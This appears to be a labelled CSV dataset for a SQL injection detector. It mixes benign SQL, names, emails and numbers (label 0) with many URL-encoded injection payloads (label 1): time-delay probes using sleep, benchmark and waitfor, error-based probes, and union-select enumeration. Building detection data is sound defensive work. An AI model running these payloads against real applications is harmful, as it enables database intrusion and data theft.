Query,Label
%40variable,1
1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%202716%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%20%20%29%20%20--,1
4560,0
1%27%7C%7C%20%20%28%20%20select%20%27yhpe%27%20where%208010%20%20%3D%20%208010%20rlike%20%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%207910%20%20%3D%20%203752%20%20%29%20%20%20then%201%20else%200x28%20end%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%7C%7C%27,1
2293,0
-1375%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%20%20%20%28%20%201226%20%20%3D%20%209648%20%20%29%20%20%2A9648%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27kfoy%27%20like%20%27kfoy,1
iif%20%20%28%20%201305%20%20%3D%20%205656%2C1%2C1/0%20%20%29,1
select%20%2A%20from%20users%20where%20id%20%20%3D%20%20%271%27%20union%20select%20%24%20_%2C%40%40VERSION%20--%201%27,1
SELECT thus ( s )  FROM earth LEFT JOIN,0
chuvalo@ppmanzanares.nc,0
SELECT * FROM central WHERE experience = 'movement',0
"SELECT swim, again, thrown FROM diameter WHERE driver  IS NULL",0
masters-mcnear@costablancarental.ax,0
1%22%20%20%29%20%20%20as%20bksv%20where%205375%20%20%3D%20%205375,1
1%27%20where%201844%20%20%3D%20%201844,1
SELECT * FROM bring FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM again,0
1?i0l,0
prdica,0
SELECT * FROM  ( SELECT problem FROM exercise ),0
irado,0
1%27%20where%209544%20%20%3D%20%209544,1
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20as%20vqrt%20where%205173%20%20%3D%20%205173%20and%203707%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20%20%29%20%20--,1
1%22%20%20%29%20%20%20as%20rcnk%20where%201800%20%20%3D%20%201800,1
"UPDATE hot SET fat =  'wash', City =  'band' WHERE almost =  root",0
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'property_type' )  ORDER BY t.name ASC",0
1%27%20%20%29%20%20%20or%20exp%20%20%28%20%20~%20%20%28%20%20select%20%2A%20from%20%20%20%28%20%20select%20concat%20%20%28%20%200x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%206270%20%20%3D%20%206270%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%2C0x78%20%20%20%29%20%20%20%20%29%20%20%20x%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%28%20%20%27thce%27%20%20%3D%20%20%27thce,1
select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20and%20%20%20%20%28%20%20%20%20%28%20%20%203508%20%20%3D%20%203508,1
1%27%20%20%29%20%20%20as%20vpop%20where%202528%20%20%3D%20%202528%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,1
ataz crehuet,0
karchevs,0
1%20%20%20%29%20%20%20%20%29%20%20%20%20as%20xovu%20where%204530%20%20%3D%20%204530%20or%204411%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%20%20%29%20%20--,1
1%27%20where%202332%20%20%3D%20%202332%20or%209643%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20%20%29%20%20--,1
SELECT * FROM hardly WHERE    NOT itself = 'trade',0
clooney,0
SELECT * FROM evidence WHERE square  BETWEEN 10 AND 20,0
-3211%20%20%20%29%20%20%20%20%29%20%20%20%20as%20fsej%20where%206348%20%20%3D%20%206348%20or%209805%20%20%3D%20%203783--,1
SELECT COUNT ( pine )  FROM cut,0
59072549q,0
7.68942E+15,0
-4961%27%20%20%29%20%20%20or%203038%20%20%3D%20%203038,1
select%20dbms_pipe.receive_message%20%20%28%20%20chr%20%20%28%20%2066%20%20%29%20%20%7C%7Cchr%20%20%28%20%2067%20%20%29%20%20%7C%7Cchr%20%20%28%20%2079%20%20%29%20%20%7C%7Cchr%20%20%28%20%20101%20%20%29%20%20%2C5%20%20%29%20%20%20from%20dual%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27cgou%27%20like%20%27cgou,1
-4713%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%204567%20%20%3D%20%201287,1
"avinguda carrilet, 21,",0
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%208384%20%20%3D%20%20like%20%20%28%20%20%27abcdefg%27%2Cupper%20%20%28%20%20hex%20%20%28%20%20randomblob%20%20%28%20%20500000000/2%20%20%20%29%20%20%20%20%29%20%20%20%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%22wvyb%22%20%20%3D%20%20%22wvyb,1
1%27%20in%20boolean%20mode%20%20%29%20%20%20and%203707%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20%20%29%20%20%23,1
"SELECT copy, continued, futureFROM apartment WHERE growth  IS NOT NULL",0
SELECT COUNT ( symbol ) FROM planned,0
SELECT curious ( s )  FROM pencil,0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_number_of_preferred_partners' LIMIT 1,0
select%20benchmark%20%20%28%20%205000000%2Cmd5%20%20%28%20%200x4c4d6142%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%28%20%20%22poik%22%20%20%3D%20%20%22poik,1
SELECT MIN ( said )  AS deal FROM statement,0
SELECT * FROM chosen WHERE importance = 'nest' LIMIT 3,0
1%20%20%20%29%20%20%20%20%29%20%20%20%20and%209254%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%20%20%29%20%20--,1
select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20and%20%20%20%28%20%20%22%25%22%20%20%3D%20%20%22,1
DELETE FROM wrong,0
SELECT * FROM shout WHERE flame BETWEEN '1996-07-01' AND '1996-07-31',0
"SELECT scientist,film,experiment FROM bone LEFT JOIN Orders ON stretch.mailID =  least.brass ORDER BY shoot.hurried",0
-4557%20or%206872%20%20%3D%20%206872--%20kkte,1
1%20or%20%20%20%28%20%20select%20%2A%20from%20%20%20%28%20%20select%20%20%28%20%20sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20ydpu%20%20%29%20%20--%20paxv,1
"SELECT white,breeze,beneath,per,surface     (  (  feed JOIN experience ON facing.sign =  bend.doing )   INNER JOIN simpleON Orders.poor =  stand.forwardID )",0
almazora/almassora,0
besal,0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%208466%20%20%3D%20%20benchmark%20%20%28%20%205000000%2Cmd5%20%20%28%20%200x694a4745%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27tpeo%27%20like%20%27tpeo,1
SELECT AVG ( fort ) FROM interior,0
SELECT TOP 3 * FROM just WHERE doll = 'adventure' SELECT * FROM try,0
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20%20%20%28%20%20select%20%2A%20from%20%20%20%28%20%20select%20%20%28%20%20sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20fzno%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%22uncg%22%20%20%3D%20%20%22uncg,1
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20and%20char%20%20%28%20%20107%20%20%29%20%20%7C%7Cchar%20%20%28%20%20121%20%20%29%20%20%7C%7Cchar%20%20%28%20%2097%20%20%29%20%20%7C%7Cchar%20%20%28%20%2080%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20left%20%20%28%20%20crypt_key%20%20%28%20%20char%20%20%28%20%2065%20%20%29%20%20%7C%7Cchar%20%20%28%20%2069%20%20%29%20%20%7C%7Cchar%20%20%28%20%2083%20%20%29%20%20%2Cnull%20%20%29%20%20%2C0%20%20%29%20%20%2C500000000%20%20%29%20%20%2Cnull%20%20%29%20%20--,1
1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20rlike%20%20%20%28%20%20select%20%2A%20from%20%20%20%28%20%20select%20%20%28%20%20sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20sgvo%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%204574%20%20%3D%20%204574,1
"SELECT arrangement,worse FROM soft WHERE wrong = 'wet' UNION SELECT rubbed, appearance FROM through",0
febrido,0
SELECT halfway ( s )  FROM correct,0
champ,0
bethania,0
SELECT * FROM ate WHERE Price NOT BETWEEN 10 AND 20,0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20and%203202%20%20%3D%20%20like%20%20%28%20%20%27abcdefg%27%2Cupper%20%20%28%20%20hex%20%20%28%20%20randomblob%20%20%28%20%20500000000/2%20%20%20%29%20%20%20%20%29%20%20%20%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27nbsr%27%20like%20%27nbsr,1
39515,0
-7686%25%22%20%20%29%20%20%20or%201%20group%20by%20concat%20%20%28%20%200x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204232%20%20%3D%20%204232%20%20%29%20%20%20then%201%20else%200%20end%20%20%20%29%20%20%20%20%29%20%20%20%2C0x717a767a71%2Cfloor%20%20%28%20%20rand%20%20%28%20%200%20%20%29%20%20%2A2%20%20%20%29%20%20%20%20%29%20%20%20%20having%20min%20%20%28%20%200%20%20%29%20%20%23,1
SELECT * FROM machinery,0
1%27%20%20%29%20%20%20as%20sruz%20where%206318%20%20%3D%20%206318,1
-9145%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%20make_set%20%20%28%20%209017%20%20%3D%20%209368%2C9368%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27%25%27%20%20%3D%20%20%27,1
1%25%27%20and%208514%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20%20%29%20%20%20and%20%27%25%27%20%20%3D%20%20%27,1
1%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%202388%20%20%3D%20%20benchmark%20%20%28%20%205000000%2Cmd5%20%20%28%20%200x6d457153%20%20%20%29%20%20%20%20%29%20%20%20%23,1
SELECT * FROM understanding WHERE Price NOT BETWEEN 10 AND 20,0
palera,0
1%25%22%20%20%29%20%20%20waitfor%20delay%20%270%3A0%3A5%27%20and%20%20%20%28%20%20%22%25%22%20%20%3D%20%20%22,1
SELECT * FROM ever WHERE voyage BETWEEN 'ground' AND 'shelf',0
1%22%20where%207245%20%20%3D%20%207245%20and%209198%20%20%3D%20%209198--,1
SELECT least ( s ) FROM again INNER JOIN,0
SELECT about FROM tell UNION ALL SELECT nose FROM bad ORDER BY safety,0
SELECT * FROM type  WHERE cow NOT LIKE '[rocky]%',0
call%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20right%20%20%28%20%20char%20%20%28%20%203702%20%20%29%20%20%2C0%20%20%29%20%20%2C500000000%20%20%29%20%20%2Cnull%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27frpo%27%20like%20%27frpo,1
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20rlike%20sleep%20%20%28%20%205%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22ahhx%22%20like%20%22ahhx,1
45440,0
bohdan,0
-8612%27%2B%20%20%28%20%20select%20%27iqla%27%20where%205035%20%20%3D%20%205035%20union%20all%20select%205035%2C5035%2C5035%2C5035%2C5035%2C5035%2C5035%23,1
SELECT TOP 3 * FROM climate SELECT * FROM rate 3SELECT * FROM show,0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367659 ),0
SELECT TOP 50 PERCENT * FROM compound,0
35210254z,0
1%20%20%20%29%20%20%20%20%29%20%20%20%20as%20atiy%20where%203855%20%20%3D%20%203855%20and%206055%20%20%3D%20%20ctxsys.drithsx.sn%20%20%28%20%206055%2C%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%206055%20%20%3D%20%206055%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20--,1
"SELECT Employees.tomorrow, COUNT ( Orders.silenceID )  AS heardFROM    ( OrdersINNER JOIN store ON Orders.islandID  =  Employees.elseID )",0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%205451%20%20%3D%20%205451%20%20%29%20%20%20then%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20right%20%20%28%20%20char%20%20%28%20%205451%20%20%29%20%20%2C0%20%20%29%20%20%2C500000000%20%20%29%20%20%2Cnull%20%20%29%20%20%20else%20char%20%20%28%20%20108%20%20%29%20%20%7C%7Cchar%20%20%28%20%2076%20%20%29%20%20%7C%7Cchar%20%20%28%20%20112%20%20%29%20%20%7C%7Cchar%20%20%28%20%20116%20%20%29%20%20%20end%20%20%29%20%20%20from%20information_schema.system_users%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27owga%27%20like%20%27owga,1
SELECT COUNT ( thumb ) FROM elephant,0
"SELECT solid AS what, floor AS [practice]  FROM title",0
%22%20or%20%22%22%26%22,1
SELECT COUNT ( cuttingID ) FROM way,0
-6030%25%27%20%20%29%20%20%20or%203038%20%20%3D%20%203038,1
"calle darsena san magin 198,",0
-8013%25%22%20or%201570%20%20%3D%20%20convert%20%20%28%20%20int%2C%20%20%28%20%20select%20char%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20112%20%20%29%20%20%2Bchar%20%20%28%20%20106%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2B%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%201570%20%20%3D%20%201570%20%20%29%20%20%20then%20char%20%20%28%20%2049%20%20%29%20%20%20else%20char%20%20%28%20%2048%20%20%29%20%20%20end%20%20%20%29%20%20%20%20%29%20%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20122%20%20%29%20%20%2Bchar%20%20%28%20%20118%20%20%29%20%20%2Bchar%20%20%28%20%20122%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20%22%25%22%20%20%3D%20%20%22,1
SELECT fox FROM first UNION SELECT breakfast FROM mouse ORDER BY silk,0
1%20%20%29%20%20%20and%20char%20%20%28%20%20109%20%20%29%20%20%7C%7Cchar%20%20%28%20%2079%20%20%29%20%20%7C%7Cchar%20%20%28%20%2070%20%20%29%20%20%7C%7Cchar%20%20%28%20%2090%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20right%20%20%28%20%20char%20%20%28%20%205012%20%20%29%20%20%2C0%20%20%29%20%20%2C5000000000%20%20%29%20%20%2Cnull%20%20%29%20%20--,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367848 )  ORDER BY meta_id ASC",0
end%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22kvts%22%20like%20%22kvts,1
llompart maydana,0
raian,0
cortegana,0
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20as%20lomw%20where%209257%20%20%3D%20%209257%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,1
1%25%27%20%20%29%20%20%20and%202388%20%20%3D%20%20benchmark%20%20%28%20%205000000%2Cmd5%20%20%28%20%200x6d457153%20%20%20%29%20%20%20%20%29%20%20%20%23,1
SELECT AVG ( direction ) FROM television SELECT SUM ( last ),0
1%25%22%20and%202716%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%20%20%29%20%20--,1
select%20%20%20%28%20%20case%20when%20%20%20%28%20%205569%20%20%3D%20%209390%20%20%29%20%20%20then%205569%20else%201/%20%20%28%20%20select%200%20%20%29%20%20%20end%20%20%29%20%20--,1
-3505%22%20%20%29%20%20%20or%205290%20%20%3D%20%203436--,1
enconadura,0
-8612%27%20%20%29%20%20%20as%20toeu%20where%206357%20%20%3D%20%206357%20or%201570%20%20%3D%20%20convert%20%20%28%20%20int%2C%20%20%28%20%20select%20char%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20112%20%20%29%20%20%2Bchar%20%20%28%20%20106%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2B%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%201570%20%20%3D%20%201570%20%20%29%20%20%20then%20char%20%20%28%20%2049%20%20%29%20%20%20else%20char%20%20%28%20%2048%20%20%29%20%20%20end%20%20%20%29%20%20%20%20%29%20%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20122%20%20%29%20%20%2Bchar%20%20%28%20%20118%20%20%29%20%20%2Bchar%20%20%28%20%20122%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20--,1
-8636%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20union%20all%20select%201821%2C1821%2C1821%2C1821%2C1821%2C1821%2C1821%2C1821%2C1821%2C1821--,1
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%208407%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20generate_series%20%20%28%20%201%2C5000000%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27pufu%27%20like%20%27pufu,1
union%20%20%20%28%20%20select%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20%20%20%20%28%20%20select%20%40%40version%20%20%20%29%20%20%20%20%29%20%20%20%20--,1
SELECT * FROM torn WHERE dug  BETWEEN 10 AND 20,0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,1
lantarn,0
SELECT * FROM industrial WHERE cross = 'bridge' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM limited,0
2.79749E+15,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 9774 )  ORDER BY meta_id ASC",0
"SELECT column_name ( s )  FROM please,lucky",0
oestreic,0
8clo736,0
SELECT TOP 3 * FROM somehow,0
"SELECT LOG ( 2, 4 ) ;",0
1%27%20or%206793%20%20%3D%20%20%20%20%28%20%20select%206793%20from%20pg_sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%27hokd%27%20%20%3D%20%20%27hokd,1
make_set%20%20%28%20%207729%20%20%3D%20%207729%2C1%20%20%29,1
SELECT AVG ( war ) FROM layers SELECT SUM ( men ),0
waitfor%20delay%20%270%3A0%3A5%27%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22zili%22%20like%20%22zili,1
select%20%2A%20from%20users%20where%20id%20%20%3D%20%201%20or%20%22%20%20%28%20%20%3B%22%20or%201%20%20%3D%20%201%20--%201,1
SELECT COUNT ( positive ) FROM nice,0
SELECT * FROM master FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM beauty,0
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20%20%20%28%20%20select%202%2A%20%20%28%20%20if%20%20%20%28%20%20%20%20%28%20%20%20select%20%2A%20from%20%20%20%28%20%20select%20concat%20%20%28%20%200x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%203484%20%20%3D%20%203484%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%2C0x78%20%20%20%29%20%20%20%20%29%20%20%20s%20%20%29%20%20%2C%208446744073709551610%2C%208446744073709551610%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%22jmjr%22%20like%20%22jmjr,1
14399392n,0
--,1
SELECT * FROM specific WHERE various NOT LIKE 'member%',0
9423,0
-7054%20%20%29%20%20%20as%20gzvf%20where%209146%20%20%3D%20%209146%20or%203038%20%20%3D%20%203038,1
SELECT quietly FROM where UNION ALL SELECT short FROM went ORDER BY caught,0
1875,0
SELECT industry ( s )  FROM case UNION,0
1%22%20and%203707%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20%20%29%20%20%20and%20%22hvwv%22%20%20%3D%20%20%22hvwv,1
-9445%20%20%29%20%20%20as%20dmur%20where%204371%20%20%3D%20%204371%20union%20all%20select%204371%2C4371%2C4371%2C4371%2C4371%2C4371%2C4371%2C4371%2C4371%2C4371%23,1
SELECT * FROM principle,0
abieldar,0
1%20where%204641%20%20%3D%20%204641,1
1%27%20%20%29%20%20%20as%20keom%20where%207524%20%20%3D%20%207524%20and%202716%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%20%20%29%20%20--,1
22496795n,0
ci2586ta,0
SELECT * FROM whenever,0
SELECT AVG ( Price ) FROM telephone,0
exec%20sp,1
"SELECT * FROM missing WHERE fairly NOT IN  ( 'father', 'industry', 'travel' )",0
SELECT * FROM volume WHERE who = 'paint'  AND  ( good = 'discover' OR bigger = 'tired' ),0
1%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20rlike%20%20%20%28%20%20select%20%2A%20from%20%20%20%28%20%20select%20%20%28%20%20sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20sgvo%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22%25%22%20%20%3D%20%20%22,1
1%27%2C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%207734%20%20%3D%20%207734%20%20%29%20%20%20then%20%20%20%28%20%20select%20benchmark%20%20%28%20%205000000%2Cmd5%20%20%28%20%200x72747341%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20else%207734%2A%20%20%28%20%20select%207734%20from%20mysql.db%20%20%29%20%20%20end%20%20%20%29%20%20%20%20%29,1
dyck,0
mirabel,0
select%20%2A%20from%20users%20where%20id%20%20%3D%20%201%20or%20%24%3C%5C%20union%20select%201%2C%40%40VERSION%20--%201,1
SELECT hurried ( s ) FROM saw INNER JOIN,0
SELECT hot ( s )  FROM division LEFT JOIN,0
robelo@moviels.me,0
select%20%2A%20from%20users%20where%20id%20%20%3D%20%201%20or%20%221%5D%22%20or%201%20%20%3D%20%201%20--%201,1
byoungin,0
kaunas,0
mediona,0
SELECT * FROM country FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM section,0
-4972%27%20%20%20%29%20%20%20%20%29%20%20%20%20as%20kfzc%20where%208817%20%20%3D%20%208817%20union%20all%20select%208817%2C8817%2C8817%2C8817%2C8817%2C8817--,1
SELECT * FROM roar,0
SELECT * FROM  ( SELECT replied FROM straight ),0
"SELECT DATE_SUB ( ""2017-06-15"", INTERVAL 10 DAY ) ;",0
1%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20and%20extractvalue%20%20%28%20%207982%2Cconcat%20%20%28%20%200x5c%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%207982%20%20%3D%20%207982%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27%25%27%20%20%3D%20%20%27,1
depredador,0
SELECT * FROM escape WHERE everybody = 'action' LIMIT 3,0
manferidor,0
blenkarn6,0
curul,0
"SELECT action, stairs, cool FROM noun WHERE arm  IS NULL",0
-5572%22%20%20%29%20%20%20union%20all%20select%208131%2C8131%23,1
DELETE FROM pink,0
mong-tse,0
3.65591E+15,0
5215,0
tesisteco avi,0
SELECT * FROM danger ORDER BY wealth,0
SELECT * FROM fighting WHERE worth = 'rock' LIMIT 3,0
